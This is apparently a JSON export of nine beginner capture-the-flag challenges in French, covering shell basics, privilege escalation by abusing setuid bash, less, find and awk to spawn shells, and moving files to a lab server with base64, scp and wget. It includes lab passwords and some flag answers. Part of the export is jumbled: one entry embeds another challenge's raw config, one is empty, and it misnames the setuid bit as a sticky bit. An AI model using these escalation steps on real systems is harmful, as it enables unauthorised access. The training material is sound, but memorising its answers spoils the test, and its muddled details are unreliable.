{"count": 9, "results": [
    {
        "category": "Ghost in the Shell",
        "description": "\\nCopie le Flag flag_{m0n_pr3m13r_fl4g} pour valider ce challenge !",
        "id": 1,
        "max_attempts": 0,
        "name": "Intro",
        "requirements": "null",
        "state": "visible",
        "type": "standard",
        "value": 5
    },
    {
        "category": "Ghost in the Shell",
        "description": "\\nHello, jeune Padawan !\\nLe chemin pour devenir un Jedi est long. Nous allons faire tes premiers pas ensemble...\\n```\\nbash\\n$ ssh luke@10.0.0.10 -p 2222\\n```\\nConnecte toi au serveur en 10.0.0.10, sur le port 2222, avec le user \\'luke\\' et le mot de passe \\'tatooine\\'.\\n```bash\\n$ pwd\\n```\\nDans quel r\\xc3\\xa9pertoire es tu connect\\xc3\\xa9 ?\\n```bash\\n$ ls\\n```\\nQuel sont les fichiers de ce r\\xc3\\xa9pertoire ?\\n```\\n$ cat flag1.txt\\n```\\nQue contient le fichier flag1.txt ?\\nCopie ce Flag de la forme flagxxx{yyy} pour valider ce challenge !",
        "id": 2,
        "max_attempts": 0,
        "name": "LolCatz",
        "requirements": "null",
        "state": "visible",
        "type": "standard",
        "value": 10
    },
    {
        "category": "Privilege Escalation",
        "description": "\\n```bash\\n$ ssh theprofessor@IPSERVER -p PORT\\n```\\nConnecte toi au serveur en IPSERVER, sur le port PORT, avec le user \\'theprofessor\\' et le mot de passe \\'darko\\'.\\n```bash\\nid\\n```\\nUtilise la commande id pour savoir quel est ton userId, et \\xc3\\xa0 quels groupes tu appartiens.\\nVa faire un tour dans le /home de tokio.\\n```\\ncd /home/bash\\nls -al find\\n```\\nTu vois ce petit s ? Tokio a laiss\\xc3\\xa9 trainer l executable du shell bash avec un sticky bit activ\\xc3\\xa9. Si tu lances ce shell, il va s executer sous le userId de son propri\\xc3\\xa9taire, tokio.\\n```\\n./bash\\n```\\nN oublie pas le ./ du bash, pour executer ce binaire et pas celui contenu dans ton $PATH.\\n```\\nid\\n```\\nQui es tu maintenant ?",
        "id": 3,
        "max_attempts": 0,
        "name": "J ai le shell qui colle",
        "requirements": "null",
        "state": "visible",
        "type": "standard",
        "value": 10
    },
    {
        "category": "Privilege Escalation",
        "description": "\\n```bash\\n$ ssh tokio@IPSERVER -p 2223\\n```\\nConnecte toi au serveur en IPSERVER, sur le port 2223, avec le user \\'tokio\\' et le mot de passe \\'esther\\'.\\n```\\nid\\n```\\nRegarde quel est ton id\\n```\\ncd /home/moscow\\n```\\nVa dans le r\\xc3\\xa9pertoire de moscow\\n```\\nls -al flag02.txt\\ncat flag02.txt\\n```\\nEssaye de lire son flag.\\n```\\nls -al\\n./less flag02.txt\\n```\\nLe binaire less poss\\xc3\\xa8de un sticky bit. Less est un utilitaire qui permet de lire un fichier et de se d\\xc3\\xa9placer en avant et en arri\\xc3\\xa8re. Tu vas pouvoir lire le fichier comme si tu \\xc3\\xa9tais moscow.\\nSors du less en tapant \\'q\\'.\\nTu peux ouvrir un shell en tapant \\'!sh\\'.\\n```\\nid\\ncat flag02.txt\\n```",
        "id": 4,
        "max_attempts": 0,
        "name": "Pas moins",
        "requirements": "null",
        "state": "visible",
        "type": "standard",
        "value": 10
    },
    {
        "category": "Privilege Escalation",
        "description": "\\n```bash\\n$ ssh moscow@IPSERVER -p 2222\\n```\\nConnecte toi au serveur en 10.0.0.10, sur le port 2223, avec le user \\'moscow\\' et le mot de passe \\'alvaro\\'.\\n```\\nid\\n```\\nRegarde quel est ton id\\n```\\ncd /home/rio\\n```\\nVa dans le r\\xc3\\xa9pertoire de rio\\n```ls -al flag03.txt\\ncat flag03.txt\\n```\\nEssaye de lire son flag.\\n```\\nls -al\\n./find . -name flags.yml -exec id \\\\\\\\;\\n```Le binaire find poss\\xc3\\xa8de un sticky bit. Tu vas pouvoir l\\'utiliser comme si tu \\xc3\\xa9tais rio.\\nL\\'option -exec permet de lancer des commandes shell. Utilise la pour lancer la commande id.\\n```\\n./find . -name flags.yml -exec cat {} \\\\\\\\;\\n```\\nLisons le flag.\\n```\\n./find . -name flags.yml -exec /bin/bash \\\\\\\\;\\n```\\nEt ouvrons un shell.\\n```\\nid\\n```\\n[Challenge_4]\\nname:  Une petite histoire du temps\\nvalue: 10\\ncategory:  Privilege Escalation\\nflag:  flag04{sup3r_j_4im3_l3s_f3ux_d3_j01e}\\n#file:\\ndescription:\\n```bash\\\\r\\\\n$ ssh rio@10.0.0.10 -p 2222\\\\r\\\\n```\\\\r\\\\nConnecte toi au serveur en 10.0.0.10, sur le port 2223, avec le user \\'rio\\' et le mot de passe \\'paco\\'.\\\\r\\\\n\\\\r\\\\n```\\\\r\\\\nid\\\\r\\\\n```\\\\r\\\\nRegarde quel est ton id\\\\r\\\\n\\\\r\\\\n```\\\\r\\\\ncd /home/berlin\\\\r\\\\n```\\\\r\\\\nVa dans le r\\\\u00e9pertoire de berlin\\\\r\\\\n\\\\r\\\\n```\\\\r\\\\nls -al\\\\r\\\\n./awk \\'BEGIN{system(\\\\\"id\\\\\")}\\'\\\\r\\\\n```\\\\r\\\\nLe binaire awk poss\\\\u00e8de un sticky bit. awk est un utilitaire de manipulation de fichier. Tu vas pouvoir l\\'utiliser comme si tu \\\\u00e9tais rio. Il permet de lancer des commandes shell. Utilise le pour lancer la commande id.\\\\r\\\\n\\\\r\\\\n```\\\\r\\\\n./awk \\'BEGIN{system(\\\\\"cat flag04.txt\\\\\")}\\'\\\\r\\\\n```\\\\r\\\\nLisons le flag.\\\\r\\\\n\\\\r\\\\n```\\\\r\\\\n./awk \\'BEGIN{system(\\\\\"/bin/bash\\\\\")}\\'\\\\r\\\\n```\\\\r\\\\nEt ouvrons un shell.\\\\r\\\\n\\\\r\\\\n```\\\\r\\\\nid\\\\r\\\\n```",
        "id": 5,
        "max_attempts": 0,
        "name": "Trouv\\xc3\\xa9 !",
        "requirements": "null",
        "state": "visible",
        "type": "standard",
        "value": 10
    },
    {
        "category": "Privilege Escalation",
        "description": "",
        "id": 6,
        "max_attempts": 0,
        "name": "",
        "requirements": "null",
        "state": "visible",
        "type": "standard",
        "value": 10
    },
    {
        "category": "File Upload",
        "description": "\\nAvant tout, t\\\\u00e9l\\\\u00e9charge le fichier flag01_enc.bin sur ton Kali.\\\\r\\\\n```\\\\r\\\\ncat flag01_enc.bin\\\\r\\\\n```\\\\r\\\\nEt oui, c\\'est du binaire illisible.\\\\r\\\\n\\\\r\\\\n```bash\\\\r\\\\n$ ssh user1@10.0.0.10 -p 2224\\\\r\\\\n```\\\\r\\\\nPuis connecte toi au serveur en 10.0.0.10, sur le port 2224, avec le user \\'user1\\' et le mot de passe \\'password\\'.\\\\r\\\\n\\\\r\\\\nLe programme dechiffre_01 va te d\\\\u00e9chiffrer le fichier flag01_enc.bin une fois transf\\\\u00e9r\\\\u00e9 sur le serveur.\\\\r\\\\n\\\\r\\\\n```\\\\r\\\\ncat flag01_enc.bin | base64\\\\r\\\\n```\\\\r\\\\nSur ton kali, encode flag01_enc.bin en base64. L\\'encodage base64 permet de transf\\\\u00e9rer des fichier binaires en mode texte.\\\\r\\\\n\\\\r\\\\n```\\\\r\\\\necho \\\\\"RXQgb3VpLCDDp2EgbWFyY2hlCg===\\\\\"| base64 --decode > flag01_enc\\\\r\\\\n```\\\\r\\\\nFais ensuite un copier/coller de la chaine base64 g\\\\u00e9n\\\\u00e9r\\\\u00e9e qui ressemble \\\\u00e0 RXQgb3VpLCDDp2EgbWFyY2hlCg== dans ton shell sur le serveur. D\\\\u00e9code avec base64 --decode, et sauve dans le fichier flag01_enc.\\\\r\\\\n\\\\r\\\\n```\\\\r\\\\ndechiffre_01 flag01_enc flag01.txt\\\\r\\\\n```\\\\r\\\\nUtilise d\\\\u00e9chiffre01 pour d\\\\u00e9chiffrer le flag encod\\\\u00e9 et le sauver dans flag01.txt\\\\r\\\\n",
        "id": 7,
        "max_attempts": 0,
        "name": "Copier - Coller",
        "requirements": "null",
        "state": "visible",
        "type": "standard",
        "value": 10
    },
    {
        "category": "File Upload",
        "description": "\\nAvant tout, t\\\\u00e9l\\\\u00e9charge le fichier dechiffre_02 sur ton Kali.\\\\r\\\\n```\\\\r\\\\nls -al dechiffre_02\\\\r\\\\n```\\\\r\\\\nIl fait 8k, c\\'est un peu gros cette fois pour un copier/coller...\\\\r\\\\n\\\\r\\\\n```bash\\\\r\\\\n$ ssh user1@10.0.0.10 -p 2224\\\\r\\\\n```\\\\r\\\\nPuis connecte toi au serveur en 10.0.0.10, sur le port 2224, avec le user \\'user1\\' et le mot de passe \\'password\\'.\\\\r\\\\n\\\\r\\\\n```\\\\r\\\\nscp -P 2224 dechiffre_02 user1@10.0.0.10:dechiffre02\\\\r\\\\n```\\\\r\\\\nTu as un acc\\\\u00e8s ssh, utilise le mode de transfert de fichier de ssh.\\\\r\\\\n",
        "id": 8,
        "max_attempts": 0,
        "name": "Secure copy",
        "requirements": "null",
        "state": "visible",
        "type": "standard",
        "value": 10
    },
    {
        "category": "File Upload",
        "description": "\\nAvant tout, t\\\\u00e9l\\\\u00e9charge le fichier dechiffre_03 sur ton Kali.\\\\r\\\\n```\\\\r\\\\npython -m SimpleHTTPServer 8080\\\\r\\\\n```\\\\r\\\\nDans le m\\\\u00eame r\\\\u00e9pertoire que ce fichier, lance un serveur web avec une ligne de python.\\\\r\\\\nTon Kali dispose maintenant d\\'un serveur web pr\\\\u00eat \\\\u00e0 transf\\\\u00e9rer les fichiers localis\\\\u00e9s dans le m\\\\u00eame r\\\\u00e9pertoire.\\\\r\\\\n\\\\r\\\\n```bash\\\\r\\\\nifconfig\\\\r\\\\n```\\\\r\\\\nRecup\\\\u00e8re l\\'adresse IP de ton Kali.\\\\r\\\\n\\\\r\\\\n```bash\\\\r\\\\n$ ssh user1@10.0.0.10 -p 2224\\\\r\\\\n```\\\\r\\\\nPuis connecte toi au serveur en 10.0.0.10, sur le port 2224, avec le user \\'user1\\' et le mot de passe \\'password\\'.\\\\r\\\\n\\\\r\\\\n```bash\\\\r\\\\nwget http://[IP de ton Kali]:8080/dechiffre_03\\\\r\\\\n```\\\\r\\\\nR\\\\u00e9cup\\\\u00e8re le fichier en utilisant une requ\\\\u00eate HTTP.\\\\r\\\\n",
        "id": 9,
        "max_attempts": 0,
        "name": "Hep Serveur !",
        "requirements": "null",
        "state": "visible",
        "type": "standard",
        "value": 10
    }
], "meta": {}}